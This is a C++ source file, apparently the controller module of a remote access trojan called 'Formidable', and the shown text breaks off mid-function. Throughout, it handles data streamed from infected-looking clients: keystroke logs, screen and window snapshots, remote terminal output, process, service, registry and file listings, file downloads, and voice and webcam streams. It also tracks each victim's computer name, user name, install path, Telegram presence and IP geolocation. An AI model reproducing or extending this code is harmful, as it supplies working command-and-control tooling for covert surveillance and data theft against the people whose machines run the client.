// CommandHandler.cpp - 命令处理模块实现
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <objbase.h>
#include <objidl.h>
#include <mmsystem.h>
#include <gdiplus.h>

#include "CommandHandler.h"
#include "../../Common/ClientTypes.h"
#include "../../Common/Config.h"
#include "../../Common/Utils.h"
#include "../resource.h"
#include "../GlobalState.h"
#include "../NetworkHelper.h"
#include "../MainWindow.h"
#include "../Utils/StringHelper.h"
#include "../UI/TerminalDialog.h"
#include <CommCtrl.h>
#include <shellapi.h>
#include <map>
#include <mutex>
#include <thread>
#include <sstream>

#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

using namespace Formidable;

static std::map<uint32_t, int> s_screenLogState;
using namespace Formidable::Utils;

// 外部声明
extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HWND g_hMainWnd;
extern HWND g_hListClients;

namespace Formidable {
namespace Core {

// 实现代码...

// 自定义消息
#define WM_LOC_UPDATE (WM_USER + 101)
#define WM_UPDATE_PROGRESS (WM_USER + 201)


void CommandHandler::HandlePacket(uint32_t clientId, const BYTE* pData, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (!client || !client->active) return;

    // 优先检查：如果是裸 ClientInfo（未用 CommandPkg 包装），直接处理上线
    // 原始协议：客户端连接后直接发送 PkgHeader + ClientInfo
    if (iLength == sizeof(Formidable::ClientInfo) && client->listIndex == -1) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pData);
        return;
    }

    // 其他数据都应该是 CommandPkg 格式
    // CommandPkg的实际大小是 sizeof(CommandPkg) - 1 + 数据长度
    if (iLength < sizeof(Formidable::CommandPkg) - 1) {
        // 数据太短，无法处理
        return;
    }
    
    Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)pData;
    
    // 处理上线包（新版本格式）：cmd=0, arg1=sizeof(ClientInfo) 表示这是上线注册包
    if (pkg->cmd == 0 && pkg->arg1 == sizeof(Formidable::ClientInfo)) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pkg->data);
        return;
    }
    
    switch (pkg->cmd) {
        case Formidable::CMD_HEARTBEAT:
            HandleHeartbeat(clientId, pkg, iLength);
            break;
        case Formidable::CMD_PROCESS_LIST:
            HandleProcessList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_PROCESS_MODULES:
            HandleModuleList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_SERVICE_LIST:
        case Formidable::CMD_SERVICE_START:
        case Formidable::CMD_SERVICE_STOP:
        case Formidable::CMD_SERVICE_DELETE:
            HandleServiceList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_WINDOW_LIST:
            HandleWindowList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_WINDOW_SNAPSHOT:
            HandleWindowSnapshot(clientId, pkg, iLength);
            break;
        case Formidable::CMD_KEYLOG:
            HandleKeylog(clientId, pkg, iLength);
            break;
        case Formidable::CMD_TERMINAL_DATA:
            HandleTerminalData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_GET_SYSINFO:
            HandleSystemInfo(clientId, pkg, iLength);
            break;
        case Formidable::CMD_REGISTRY_CTRL:
            HandleRegistryData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_LIST:
            HandleFileList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_DRIVE_LIST:
            HandleDriveList(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_DATA:
            HandleFileData(clientId, pkg, iLength);
            break;
        case Formidable::CMD_FILE_DOWNLOAD:
            HandleFileDownload(clientId, pkg, iLength);
            break;
        case Formidable::CMD_SCREEN_CAPTURE:
            HandleScreenCapture(clientId, pkg, iLength);
            break;
        case Formidable::CMD_MOUSE_EVENT:
            // 鼠标事件由客户端处理，Master端不需要响应
            break;
        case Formidable::CMD_KEY_EVENT:
            // 键盘事件由客户端处理，Master端不需要响应
            break;
        case Formidable::CMD_VOICE_STREAM:
            HandleVoiceStream(clientId, pkg, iLength);
            break;
        case Formidable::CMD_VIDEO_STREAM:
            HandleVideoStream(clientId, pkg, iLength);
            break;
        default:
            break;
    }
}

void CommandHandler::HandleHeartbeat(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (iLength >= sizeof(Formidable::CommandPkg)) {
        if (pkg->arg1 == sizeof(Formidable::ClientInfo)) {
            Formidable::ClientInfo* newInfo = (Formidable::ClientInfo*)pkg->data;
            uint64_t now = GetTickCount64();
            int32_t rtt = (int32_t)(now - client->lastHeartbeatSendTime);

            memcpy(&client->info, newInfo, sizeof(Formidable::ClientInfo));
            client->info.rtt = rtt;

            {
                std::wstring computerName = Utils::StringHelper::UTF8ToWide(client->info.computerName);
                std::wstring userName = Utils::StringHelper::UTF8ToWide(client->info.userName);
                std::wstring uniqueKey = computerName + L"_" + userName;

                if (!computerName.empty() || !userName.empty()) {
                    std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
                    HistoryHost& hist = g_HistoryHosts[uniqueKey];
                    hist.clientUniqueId = client->info.clientUniqueId;
                    hist.ip = Utils::StringHelper::UTF8ToWide(client->ip);
                    hist.computerName = computerName;
                    hist.userName = userName;
                    hist.osVersion = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
                    hist.installTime = Utils::StringHelper::UTF8ToWide(client->info.installTime);
                    hist.programPath = Utils::StringHelper::UTF8ToWide(client->info.programPath);
                    hist.remark = client->remark;

                    SYSTEMTIME st;
                    GetLocalTime(&st);
                    wchar_t szTime[64];
                    swprintf_s(szTime, L"%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
                    hist.lastSeen = szTime;
                }
            }

            // 更新 UI
            std::wstring wRTT = std::to_wstring(rtt) + L"ms";
            std::wstring wActWin = Utils::StringHelper::UTF8ToWide(client->info.activeWindow);
            std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);

            if (client->listIndex >= 0) {
        LVITEMW lvi = { 0 };
        lvi.iSubItem = 7; // RTT
        lvi.pszText = (LPWSTR)wRTT.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
        
        lvi.iSubItem = 10; // Uptime
        lvi.pszText = (LPWSTR)wUptime.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
        
        lvi.iSubItem = 11; // Active Window
        lvi.pszText = (LPWSTR)wActWin.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, client->listIndex, (LPARAM)&lvi);
    } else {
        // 如果客户端已经在列表中但 listIndex 还是 -1（可能重连），重新插入或更新
        HandleClientInfo(clientId, &client->info);
    }
}
    }
    client->lastHeartbeat = GetTickCount64();
}

void CommandHandler::HandleClientInfo(uint32_t clientId, const Formidable::ClientInfo* info) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    if (!info) return;
    memcpy(&client->info, info, sizeof(Formidable::ClientInfo));
    
    // 同步备注和分组
    std::wstring computerName = Utils::StringHelper::UTF8ToWide(client->info.computerName);
    std::wstring userName = Utils::StringHelper::UTF8ToWide(client->info.userName);
    std::wstring uniqueKey = computerName + L"_" + userName;

    {
        std::lock_guard<std::mutex> lock(g_SavedRemarksMutex);
        if (g_SavedRemarks.count(uniqueKey)) {
            client->remark = g_SavedRemarks[uniqueKey];
        } else if (info->remark[0] != L'\0') {
            client->remark = info->remark;
        }
    }

    if (client->group.empty() && info->group[0] != L'\0') client->group = info->group;
    
    // 更新历史记录
    {
        std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
        HistoryHost& hist = g_HistoryHosts[uniqueKey];
        hist.clientUniqueId = client->info.clientUniqueId;
        hist.installTime = Utils::StringHelper::UTF8ToWide(client->info.installTime);
        hist.programPath = Utils::StringHelper::UTF8ToWide(client->info.programPath);
        hist.ip = Utils::StringHelper::UTF8ToWide(client->ip);
        hist.computerName = computerName;
        hist.userName = userName;
        hist.osVersion = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        wchar_t szTime[64];
        swprintf_s(szTime, L"%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        hist.lastSeen = szTime;
        hist.remark = client->remark;
    }
    
    std::wstring wIP = Utils::StringHelper::UTF8ToWide(client->ip);
    int index = client->listIndex;

    SendMessageW(g_hListClients, WM_SETREDRAW, FALSE, 0);

    if (index < 0) {
        LVITEMW lvi = { 0 };
        lvi.mask = LVIF_TEXT | LVIF_PARAM;
        lvi.pszText = (LPWSTR)wIP.c_str();
        lvi.lParam = (LPARAM)clientId;
        lvi.iItem = 0; // 插入到最前面

        index = (int)SendMessageW(g_hListClients, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
        
        // 更新其他所有在线客户端的 listIndex
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            for (auto& pair : g_Clients) {
                if (pair.second->clientId != clientId && pair.second->listIndex >= 0) {
                    pair.second->listIndex++;
                }
            }
        }
        client->listIndex = index;
    } else {
        // 更新第一列（IP）
        LVITEMW lvi = { 0 };
        lvi.iSubItem = 0;
        lvi.pszText = (LPWSTR)wIP.c_str();
        SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lvi);
    }
    
    std::wstring wPort = std::to_wstring(client->port);
    std::wstring wLAN = Utils::StringHelper::UTF8ToWide(client->info.lanAddr);
    std::wstring wComp = Utils::StringHelper::UTF8ToWide(client->info.computerName);
    std::wstring wUserGroup = Utils::StringHelper::UTF8ToWide(client->info.userName) + L"/" + client->info.group;
    std::wstring wOS = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
    std::wstring wRTT = std::to_wstring(client->info.rtt) + L"ms";
    std::wstring wVer = Utils::StringHelper::UTF8ToWide(client->info.version);
    std::wstring wInst = Utils::StringHelper::UTF8ToWide(client->info.installTime);
    std::wstring wUptime = Utils::StringHelper::UTF8ToWide(client->info.uptime);
    std::wstring wActWin = Utils::StringHelper::UTF8ToWide(client->info.activeWindow);

    LVITEMW lviSet = { 0 };
    lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wPort.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)L"正在获取...";
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wLAN.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 4; lviSet.pszText = (LPWSTR)wComp.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 5; lviSet.pszText = (LPWSTR)wUserGroup.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 6; lviSet.pszText = (LPWSTR)wOS.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 7; lviSet.pszText = (LPWSTR)wRTT.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 8; lviSet.pszText = (LPWSTR)wVer.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 9; lviSet.pszText = (LPWSTR)wInst.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 10; lviSet.pszText = (LPWSTR)wUptime.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 11; lviSet.pszText = (LPWSTR)wActWin.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    lviSet.iSubItem = 12; lviSet.pszText = (LPWSTR)client->remark.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);
    
    std::wstring wCamera = client->info.hasCamera ? L"是" : L"否";
    lviSet.iSubItem = 13; lviSet.pszText = (LPWSTR)wCamera.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);

    std::wstring wTelegram = client->info.hasTelegram ? L"是" : L"否";
    lviSet.iSubItem = 14; lviSet.pszText = (LPWSTR)wTelegram.c_str();
    SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lviSet);

    SendMessageW(g_hListClients, WM_SETREDRAW, TRUE, 0);

    // 异步获取地理位置
    std::thread([clientId, client]() {
        std::string location = GetLocationByIP(client->ip);
        std::wstring wLoc = Utils::StringHelper::UTF8ToWide(location);
        
        struct UpdateData { uint32_t id; std::wstring loc; int index; };
        UpdateData* data = new UpdateData{ clientId, wLoc, client->listIndex };
        
        PostMessageW(g_hMainWnd, WM_LOC_UPDATE, 0, (LPARAM)data);
    }).detach();
}

void CommandHandler::HandleProcessList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hProcessDlg && IsWindow(client->hProcessDlg)) {
        HWND hList = GetDlgItem(client->hProcessDlg, IDC_LIST_PROCESS);
        ListView_DeleteAllItems(hList);
        
        int count = pkg->arg1 / sizeof(Formidable::ProcessInfo);
        Formidable::ProcessInfo* pInfo = (Formidable::ProcessInfo*)pkg->data;
        
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        for (int i = 0; i < count; i++) {
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = i;
            std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].name);
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.lParam = (LPARAM)pInfo[i].pid;
            
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
            
            std::wstring wPID = std::to_wstring(pInfo[i].pid);
            std::wstring wThreads = std::to_wstring(pInfo[i].threads);
            std::wstring wPriority = std::to_wstring(pInfo[i].priority);
            std::wstring wArch = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].arch);
            
            wchar_t szMem[64];
            if (pInfo[i].workingSet > 1024 * 1024)
                swprintf_s(szMem, L"%.1f MB", pInfo[i].workingSet / (1024.0 * 1024.0));
            else
                swprintf_s(szMem, L"%llu KB", pInfo[i].workingSet / 1024);
            
            wchar_t szCpu[32];
            swprintf_s(szCpu, L"%.1f%%", pInfo[i].cpuUsage);

            std::wstring wOwner = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].owner);
            std::wstring wPath = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].path);

            LVITEMW lviSet = { 0 };
            lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wPID.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wThreads.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wPriority.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 4; lviSet.pszText = (LPWSTR)wArch.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 5; lviSet.pszText = szMem;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 6; lviSet.pszText = szCpu;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 7; lviSet.pszText = (LPWSTR)wOwner.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 8; lviSet.pszText = (LPWSTR)wPath.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleModuleList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hModuleDlg && IsWindow(client->hModuleDlg)) {
        HWND hList = GetDlgItem(client->hModuleDlg, IDC_LIST_MODULES);
        ListView_DeleteAllItems(hList);

        int count = pkg->arg1 / sizeof(Formidable::ModuleInfo);
        Formidable::ModuleInfo* pInfo = (Formidable::ModuleInfo*)pkg->data;

        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        for (int i = 0; i < count; i++) {
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = i;
            std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].name);
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.lParam = (LPARAM)pInfo[i].baseAddr;

            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            wchar_t szBase[32];
            swprintf_s(szBase, L"0x%016llX", pInfo[i].baseAddr);
            std::wstring wSize = std::to_wstring(pInfo[i].size);
            std::wstring wPath = Formidable::Utils::StringHelper::UTF8ToWide(pInfo[i].path);

            LVITEMW lviSet = { 0 };
            lviSet.iSubItem = 1; lviSet.pszText = szBase;
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wSize.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
            lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wPath.c_str();
            SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleTerminalData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hTerminalDlg && IsWindow(client->hTerminalDlg)) {
        std::string text(pkg->data, pkg->arg1);
        std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
        
        // 使用自定义消息发送数据，让对话框自己处理
        SendMessageW(client->hTerminalDlg, WM_TERMINAL_APPEND_TEXT, 0, (LPARAM)wText.c_str());
    }
}

void CommandHandler::HandleWindowList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
        HWND hList = GetDlgItem(client->hWindowDlg, IDC_LIST_WINDOW);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        // 客户端发送的是字符串格式，格式为：hwnd|className|title\n
        std::string data(pkg->data, pkg->arg1);
        std::istringstream ss(data);
        std::string line;
        int index = 0;

        while (std::getline(ss, line)) {
            if (line.empty()) continue;

            // 解析每行数据：hwnd|className|title
            size_t pos1 = line.find('|');
            if (pos1 == std::string::npos) continue;
            size_t pos2 = line.find('|', pos1 + 1);
            if (pos2 == std::string::npos) continue;

            std::string hwndStr = line.substr(0, pos1);
            std::string classNameStr = line.substr(pos1 + 1, pos2 - pos1 - 1);
            std::string titleStr = line.substr(pos2 + 1);

            // 转换hwnd
            uint64_t hwnd = 0;
            try {
                hwnd = std::stoull(hwndStr);
            } catch (...) {
                continue;
            }

            std::wstring wTitle = Utils::StringHelper::UTF8ToWide(titleStr);
            std::wstring wStatus = L"可见";

            wchar_t szHwnd[32];
            swprintf_s(szHwnd, L"0x%016llX", hwnd);

            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = index;
            lvi.pszText = (LPWSTR)wTitle.c_str();
            lvi.lParam = (LPARAM)hwnd;
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            ListView_SetItemText(hList, idx, 1, szHwnd);
            ListView_SetItemText(hList, idx, 2, (LPWSTR)wStatus.c_str());

            index++;
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleKeylog(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hKeylogDlg && IsWindow(client->hKeylogDlg)) {
        HWND hEdit = GetDlgItem(client->hKeylogDlg, IDC_EDIT_KEYLOG);
        std::string text(pkg->data, pkg->arg1);
        std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
        
        int len = GetWindowTextLengthW(hEdit);
        SendMessageW(hEdit, EM_SETSEL, len, len);
        SendMessageW(hEdit, EM_REPLACESEL, FALSE, (LPARAM)wText.c_str());
        SendMessageW(hEdit, WM_VSCROLL, SB_BOTTOM, 0);
    }
}

void CommandHandler::HandleWindowSnapshot(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
        if (pkg->arg1 > 0) {
            // 创建位图
            BITMAPFILEHEADER* pBmpFileHeader = (BITMAPFILEHEADER*)pkg->data;
            BITMAPINFOHEADER* pBmpInfoHeader = (BITMAPINFOHEADER*)(pkg->data + sizeof(BITMAPFILEHEADER));
            BYTE* pBmpData = (BYTE*)(pkg->data + pBmpFileHeader->bfOffBits);

            HDC hDC = GetDC(NULL);
            HBITMAP hBitmap = CreateDIBitmap(hDC, pBmpInfoHeader, CBM_INIT, pBmpData, (BITMAPINFO*)pBmpInfoHeader, DIB_RGB_COLORS);
            ReleaseDC(NULL, hDC);

            if (hBitmap) {
                // 清理旧位图
                if (g_WindowPreviews.count(client->hWindowDlg)) {
                    HBITMAP hOld = g_WindowPreviews[client->hWindowDlg];
                    if (hOld) DeleteObject(hOld);
                }
                g_WindowPreviews[client->hWindowDlg] = hBitmap;

                // 刷新预览控件
                HWND hPreview = GetDlgItem(client->hWindowDlg, IDC_STATIC_WIN_PREVIEW);
                InvalidateRect(hPreview, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleServiceList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hServiceDlg && IsWindow(client->hServiceDlg)) {
        std::string data(pkg->data, pkg->arg1);
        
        // 检查是否是控制命令的响应 (OK/FAIL)
        if (data == "OK" || data == "FAIL") {
            if (data == "OK") {
                // 操作成功，自动刷新列表
                Formidable::CommandPkg refreshPkg = { 0 };
                refreshPkg.cmd = Formidable::CMD_SERVICE_LIST;
                refreshPkg.arg1 = 0;
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &refreshPkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
            } else {
                MessageBoxW(client->hServiceDlg, L"服务操作失败，请检查权限。", L"错误", MB_ICONERROR);
            }
            return;
        }

        HWND hList = GetDlgItem(client->hServiceDlg, IDC_LIST_SERVICE);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        std::stringstream ss(data);
        std::string line;
        int index = 0;

        while (std::getline(ss, line)) {
            if (line.empty()) continue;
            
            // 格式: 服务名|显示名|状态|启动类型|二进制路径|服务类型
            size_t p1 = line.find('|');
            size_t p2 = line.find('|', p1 + 1);
            size_t p3 = line.find('|', p2 + 1);
            size_t p4 = line.find('|', p3 + 1);
            size_t p5 = line.find('|', p4 + 1);
            
            if (p1 == std::string::npos || p2 == std::string::npos || p3 == std::string::npos || 
                p4 == std::string::npos || p5 == std::string::npos) continue;

            std::wstring wName = Utils::StringHelper::UTF8ToWide(line.substr(0, p1));
            std::wstring wDisp = Utils::StringHelper::UTF8ToWide(line.substr(p1 + 1, p2 - p1 - 1));
            std::wstring wStatus = Utils::StringHelper::UTF8ToWide(line.substr(p2 + 1, p3 - p2 - 1));
            std::wstring wStartType = Utils::StringHelper::UTF8ToWide(line.substr(p3 + 1, p4 - p3 - 1));
            std::wstring wPath = Utils::StringHelper::UTF8ToWide(line.substr(p4 + 1, p5 - p4 - 1));
            std::wstring wServiceType = Utils::StringHelper::UTF8ToWide(line.substr(p5 + 1));

            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = index;
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.lParam = index;
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);

            ListView_SetItemText(hList, idx, 1, (LPWSTR)wDisp.c_str());
            ListView_SetItemText(hList, idx, 2, (LPWSTR)wStatus.c_str());
            ListView_SetItemText(hList, idx, 3, (LPWSTR)wStartType.c_str());
            ListView_SetItemText(hList, idx, 4, (LPWSTR)wServiceType.c_str());
            ListView_SetItemText(hList, idx, 5, (LPWSTR)wPath.c_str());
            
            index++;
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleSystemInfo(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }
    
    // 如果收到系统信息且包含 ClientInfo，则更新。系统信息模块也可返回额外细节
    if (pkg->arg1 == sizeof(Formidable::ClientInfo)) {
        HandleClientInfo(clientId, (const Formidable::ClientInfo*)pkg->data);
    }
}

void CommandHandler::HandleRegistryData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hRegistryDlg && IsWindow(client->hRegistryDlg)) {
        HWND hTree = GetDlgItem(client->hRegistryDlg, IDC_TREE_REGISTRY);
        HWND hList = GetDlgItem(client->hRegistryDlg, IDC_LIST_REGISTRY_VALUES);
        
        std::string data(pkg->data, pkg->arg1);
        std::stringstream ss(data);
        std::string line;

        if (pkg->arg2 == 1) { // Keys for Tree (Updated from 0 to 1 to match module)
             HTREEITEM hSelected = TreeView_GetSelection(hTree);
             if (hSelected) {
                 // 删除旧子项
                 HTREEITEM hChild = TreeView_GetChild(hTree, hSelected);
                 while (hChild) {
                     HTREEITEM hNext = TreeView_GetNextSibling(hTree, hChild);
                     TreeView_DeleteItem(hTree, hChild);
                     hChild = hNext;
                 }
                 
                 // 获取父节点的 lParam (根键索引)
                 TVITEMW tviParent = { 0 };
                 tviParent.mask = TVIF_PARAM;
                 tviParent.hItem = hSelected;
                 uint32_t rootIdx = 0;
                 if (TreeView_GetItem(hTree, &tviParent)) {
                     rootIdx = (uint32_t)tviParent.lParam;
                 }

                 while (std::getline(ss, line)) {
                     if (line.empty()) continue;
                     // 格式: K|键名
                     size_t pos = line.find('|');
                     if (pos == std::string::npos) continue;
                     std::string keyName = line.substr(pos + 1);
                     std::wstring wKey = Utils::StringHelper::UTF8ToWide(keyName);
                     TVINSERTSTRUCTW tvis = { 0 };
                     tvis.hParent = hSelected;
                     tvis.hInsertAfter = TVI_LAST;
                     tvis.item.mask = TVIF_TEXT | TVIF_CHILDREN | TVIF_PARAM;
